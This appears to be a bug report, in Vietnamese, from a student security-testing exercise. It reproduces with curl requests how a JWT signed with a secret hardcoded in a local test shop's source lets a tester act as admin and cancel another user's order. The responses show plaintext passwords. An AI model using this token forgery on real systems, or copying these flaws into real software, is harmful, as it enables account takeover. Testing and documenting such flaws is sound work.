@@ -1,0 +1,33 @@
+# BUG-06 – transcript tái hiện thật, 2026-11-25 16:29:48 +07, SUT eshop-sut@85af3ba
+
+# SEC-02: token phải hợp lệ; secret hardcode trong eshop-sut/backend/server.js:9
+$ scripts/reset_sut.sh   # SUT seed lại
+
+$ curl -X POST 'http://localhost:3000/api/register' -H 'X-Student-Id: 23120190' -H 'Content-Type: application/json' -d '{"name":"Bug User","email":"bug-1795598990199014240@test.com","password":"Test1234!"}'
+HTTP 200
+{"message":"User registered successfully","id":3}
+
+
+$ curl -X POST 'http://localhost:3000/api/login' -H 'X-Student-Id: 23120190' -H 'Content-Type: application/json' -d '{"email":"bug-1795598990199014240@test.com","password":"Test1234!"}'
+HTTP 200
+{"message":"Login successful","token":"eyJ***(JWT đã che)","user":{"id":3,"name":"Bug User","email":"bug-1795598990199014240@test.com","password":"Test1234!","role":"user","login_attempts":0,"locked_until":null,"reset_token":null,"shipping_address":null,"phone":null}}
+
+
+$ curl -X POST 'http://localhost:3000/api/checkout' -H 'X-Student-Id: 23120190' -H 'Authorization: Bearer $TOKEN_A' -H 'Content-Type: application/json' -d '{"total_amount":100000,"shipping_address":"HCM"}'
+HTTP 200
+{"message":"Checkout successful","orderId":1}
+
+
+# Token tự ký bằng secret lấy từ source, payload {id:1, role:admin}
+
+$ curl -X GET 'http://localhost:3000/api/users/me' -H 'X-Student-Id: 23120190' -H 'Authorization: Bearer $FORGED'
+HTTP 200
+{"id":1,"name":"Admin User","email":"admin@eshop.com","password":"Admin123!","role":"admin","login_attempts":0,"locked_until":null,"reset_token":null,"shipping_address":null,"phone":null}
+
+
+# Token tự ký với id của user A hủy được đơn của A
+
+$ curl -X PUT 'http://localhost:3000/api/orders/1/cancel' -H 'X-Student-Id: 23120190' -H 'Authorization: Bearer $FORGED_A'
+HTTP 200
+{"message":"Order canceled successfully"}
+
